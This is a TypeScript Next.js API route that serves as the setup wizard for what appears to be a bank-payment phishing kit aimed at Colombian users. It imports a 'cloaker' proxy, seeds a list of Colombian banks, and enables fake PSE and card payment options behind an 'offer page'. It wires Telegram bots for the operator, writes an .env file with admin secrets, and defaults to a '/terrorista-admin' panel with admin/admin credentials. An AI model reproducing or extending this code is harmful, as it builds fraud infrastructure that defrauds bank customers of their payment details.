import { NextRequest, NextResponse } from 'next/server';
import { createClient } from '@supabase/supabase-js';
import { getCoreGatewayEndpoint, getCoreGatewayToken } from '@/lib/cloakerProxy';
import * as fs from 'fs';
import * as path from 'path';

const DEFAULT_BANKS = [
  { codigo: '1815', nombre: 'ALIANZA FIDUCIARIA' },
  { codigo: '1558', nombre: 'BAN100' },
  { codigo: '1059', nombre: 'BANCAMIA S.A.' },
  { codigo: '1040', nombre: 'BANCO AGRARIO' },
  { codigo: '1052', nombre: 'BANCO AV VILLAS' },
  { codigo: '1013', nombre: 'BANCO BBVA COLOMBIA S.A.' },
  { codigo: '1032', nombre: 'BANCO CAJA SOCIAL' },
  { codigo: '1066', nombre: 'BANCO COOPERATIVO COOPCENTRAL' },
  { codigo: '1051', nombre: 'BANCO DAVIVIENDA' },
  { codigo: '1001', nombre: 'BANCO DE BOGOTA' },
  { codigo: '1023', nombre: 'BANCO DE OCCIDENTE' },
  { codigo: '1062', nombre: 'BANCO FALABELLA' },
  { codigo: '1063', nombre: 'BANCO FINANDINA S.A. BIC' },
  { codigo: '1012', nombre: 'BANCO GNB SUDAMERIS' },
  { codigo: '1006', nombre: 'BANCO ITAU' },
  { codigo: '1071', nombre: 'BANCO J.P. MORGAN COLOMBIA S.A.' },
  { codigo: '1047', nombre: 'BANCO MUNDO MUJER S.A.' },
  { codigo: '1060', nombre: 'BANCO PICHINCHA S.A.' },
  { codigo: '1002', nombre: 'BANCO POPULAR' },
  { codigo: '1058', nombre: 'BANCO SANTANDER COLOMBIA' },
  { codigo: '1069', nombre: 'BANCO SERFINANZA' },
  { codigo: '1065', nombre: 'BANCO UNION S.A.' },
  { codigo: '1007', nombre: 'BANCOLOMBIA' },
  { codigo: '1061', nombre: 'BANCOOMEVA S.A.' },
  { codigo: '1808', nombre: 'BOLD CF' },
  { codigo: '1081', nombre: 'BTG PACTUAL' },
  { codigo: '1283', nombre: 'CFA COOPERATIVA FINANCIERA' },
  { codigo: '1009', nombre: 'CITIBANK' },
  { codigo: '1086', nombre: 'CLARA COMPANIA DE FINANCIAMIENTO S.A.' },
  { codigo: '1292', nombre: 'CONFIAR COOPERATIVA FINANCIERA' },
  { codigo: '1291', nombre: 'COOFINEP COOPERATIVA FINANCIERA' },
  { codigo: '1289', nombre: 'COOTRAFA' },
  { codigo: '1070', nombre: 'DALE' },
  { codigo: '1084', nombre: 'GLOBAL66' },
  { codigo: '1551', nombre: 'IRIS' },
  { codigo: '1085', nombre: 'LULO BANK' },
  { codigo: '1077', nombre: 'MOVII S.A.' },
  { codigo: '1507', nombre: 'NEQUI' },
  { codigo: '1082', nombre: 'NU COLOMBIA COMPANIA DE FINANCIAMIENTO' },
  { codigo: '1083', nombre: 'POWWI' },
  { codigo: '1019', nombre: 'SCOTIABANK COLPATRIA' },
  { codigo: '1080', nombre: 'UALÁ' }
];

async function sendTelegramNotification(botToken: string, chatId: string, message: string) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.error('[Telegram Notify Error]:', err);
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { action } = body;

    // 1. Notificación 1: Probar conexión con el Bot de Telegram
    if (action === 'test_telegram') {
      const { botToken, chatId } = body;
      if (!botToken || !chatId) {
        return NextResponse.json({ success: false, error: 'Token y Chat ID son requeridos' }, { status: 400 });
      }

      // Validar bot
      const meRes = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
      const meData = await meRes.json();
      if (!meData.ok) {
        return NextResponse.json({ success: false, error: 'Token de Bot inválido en Telegram: ' + (meData.description || '') });
      }

      // Enviar Notificación 1
      const botUser = meData.result?.username ? `@${meData.result.username}` : 'Bot';
      const msgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: `🚀 <b>¡Conexión Exitosa con el Bot de Telegram!</b>\n\nEl Wizard de Instalación se ha conectado correctamente.\n🤖 <b>Bot:</b> ${botUser}\n⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`,
          parse_mode: 'HTML'
        })
      });
      const msgData = await msgRes.json();
      if (!msgData.ok) {
        return NextResponse.json({ success: false, error: 'No se pudo enviar mensaje al Chat ID indicado: ' + (msgData.description || '') });
      }

      return NextResponse.json({
        success: true,
        botUsername: meData.result.username,
        botName: meData.result.first_name,
      });
    }

    // 2. Inicializar Supabase Multi-tenant para el nuevo TELEGRAM_DTA (Sin notificaciones intermedias)
    if (action === 'init_supabase') {
      const { telegramDta, adminUser, adminPassword, projectName } = body;
      
      const supabaseUrl = body.supabaseUrl || getCoreGatewayEndpoint();
      const supabaseAnonKey = body.supabaseAnonKey || getCoreGatewayToken();

      if (!telegramDta) {
        return NextResponse.json({ success: false, error: 'TELEGRAM_DTA requerido' }, { status: 400 });
      }

      const client = createClient(supabaseUrl, supabaseAnonKey);

      // A. Insertar o actualizar configuraciones globales del proyecto
      const configs = [
        { clave: 'pago_pse', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar PSE' },
        { clave: 'pago_bancolombia', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Bancolombia' },
        { clave: 'pago_tc', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Tarjeta de Crédito' },
        { clave: 'pago_debito', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Tarjeta de Débito' },
        { clave: 'pago_davivienda', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Davivienda' },
        { clave: 'pago_breb', valor: 'true', tipo: 'boolean', descripcion: 'Habilitar Bre-B' },
        { clave: 'pse_boton_breb', valor: 'false', tipo: 'boolean', descripcion: 'Botón Bre-B en PSE' },
        { clave: 'proyecto_nombre', valor: projectName || 'PYP', tipo: 'string', descripcion: 'Nombre del Proyecto' },
        { clave: 'xdm_admin_user', valor: adminUser || 'admin', tipo: 'string', descripcion: 'Usuario Administrador XDM' },
        { clave: 'xdm_admin_password', valor: adminPassword || 'admin', tipo: 'string', descripcion: 'Contraseña Administrador XDM' },
      ];

      for (const cfg of configs) {
        await client.from('pyp_configuraciones_globales').upsert({
          pypid: telegramDta,
          clave: cfg.clave,
          valor: cfg.valor,
          tipo: cfg.tipo,
          descripcion: cfg.descripcion,
          actualizado_en: new Date().toISOString()
        }, { onConflict: 'pypid,clave' });
      }

      // B. Verificar y poblar bancos autorizados
      const { data: existingBanks } = await client
        .from('pyp_bancos_autorizados')
        .select('codigo')
        .eq('pypid', telegramDta);

      const existingCodes = new Set((existingBanks || []).map(b => b.codigo));
      const banksToInsert = DEFAULT_BANKS
        .filter(b => !existingCodes.has(b.codigo))
        .map(b => ({
          pypid: telegramDta,
          codigo: b.codigo,
          nombre: b.nombre,
          activo: true,
          logo: '',
          orden: 0,
          fecha_actualizacion: new Date().toISOString()
        }));

      if (banksToInsert.length > 0) {
        await client.from('pyp_bancos_autorizados').insert(banksToInsert);
      }

      return NextResponse.json({
        success: true,
        banksConfigured: DEFAULT_BANKS.length,
        configsInitialized: configs.length,
      });
    }

    // 3. Notificación 2: Guardar .env en disco y Notificación Final con Enlaces
    if (action === 'save_env_config') {
      const {
        botToken,
        chatId,
        chatLogs,
        telegramDta,
        projectName,
        offerPage,
        adminUser,
        adminPassword,
        currentOrigin,
      } = body;
      const envPath = path.join(process.cwd(), '.env');

      let currentAdminPath = body.adminPath || process.env.ADMIN_PATH || '';
      if (!currentAdminPath && fs.existsSync(envPath)) {
        const existingEnv = fs.readFileSync(envPath, 'utf8');
        const match = existingEnv.match(/ADMIN_PATH=([^\r\n]+)/);
        if (match) currentAdminPath = match[1].trim();
      }
      if (!currentAdminPath) currentAdminPath = '/terrorista-admin';

      const envContent = `# ==============================================================================
# CONFIGURACION DE LA PASARELA DE PAGOS (CLIENTE)
# ==============================================================================

# 1. Telegram
TELEGRAM_BOT=${botToken || ''}
TELEGRAM_CHAT=${chatId || ''}
TELEGRAM_CHAT_LOGS=${chatLogs || ''}

# 2. Identificador de Licencia y Proyecto
TELEGRAM_DTA=${telegramDta || ''}
PROYECTO=${projectName || 'PYP'}
OFFER_PAGE=${offerPage || '/'}

# 3. Credenciales Panel de Administracion (${currentAdminPath})
ADMIN_PATH=${currentAdminPath}
XDM_USER=${adminUser || 'admin'}
XDM_PASSWORD=${adminPassword || ''}
`;

      fs.writeFileSync(envPath, envContent, 'utf8');

      // Notificación 2 Final con Enlaces de Producción o Local
      if (botToken && chatId) {
        const origin = currentOrigin || request.headers.get('origin') || request.headers.get('host') || 'http://localhost:3000';
        const fullOrigin = origin.startsWith('http') ? origin : `https://${origin}`;
        const xdmUrl = `${fullOrigin}${currentAdminPath}`;
        const payUrl = `${fullOrigin}${offerPage || '/'}`;

        const finalMsg = `🎉 <b>¡INSTALACIÓN COMPLETADA CON ÉXITO!</b>\n\n` +
          `🚀 <b>El sistema está 100% activo.</b>\n\n` +
          `🛡️ <b>Panel:</b> <a href="${xdmUrl}">${xdmUrl}</a>\n` +
          `🌐 <b>Pasarela de Pagos:</b> <a href="${payUrl}">${payUrl}</a>\n\n` +
          `• <b>Proyecto:</b> <code>${projectName || 'PYP'}</code>\n` +
          `• <b>Usuario Admin:</b> <code>${adminUser || 'admin'}</code>\n` +
          `⏰ <i>${new Date().toLocaleString('es-CO')}</i>`;

        await sendTelegramNotification(botToken, chatId, finalMsg);
      }

      return NextResponse.json({
        success: true,
        message: 'Archivo .env guardado correctamente y notificación final enviada a Telegram.'
      });
    }

    // 4. Registrar Webhook de Telegram
    if (action === 'set_webhook') {
      const { botToken, domainUrl } = body;
      if (!botToken || !domainUrl) {
        return NextResponse.json({ success: false, error: 'botToken y domainUrl requeridos' }, { status: 400 });
      }

      const cleanDomain = domainUrl.trim().replace(/\/+$/, '').replace(/^https?:\/\//, '');
      const webhookUrl = `https://${cleanDomain}/api/banco/webhook`;

      const whRes = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
      const whData = await whRes.json();

      if (!whData.ok) {
        return NextResponse.json({ success: false, error: 'Telegram no pudo configurar el webhook: ' + whData.description });
      }

      return NextResponse.json({
        success: true,
        webhookUrl,
        telegramResponse: whData.description
      });
    }

    return NextResponse.json({ success: false, error: 'Acción no reconocida' }, { status: 400 });

  } catch (err: any) {
    console.error('Error en wizard API:', err);
    return NextResponse.json({ success: false, error: err.message }, { status: 500 });
  }
}
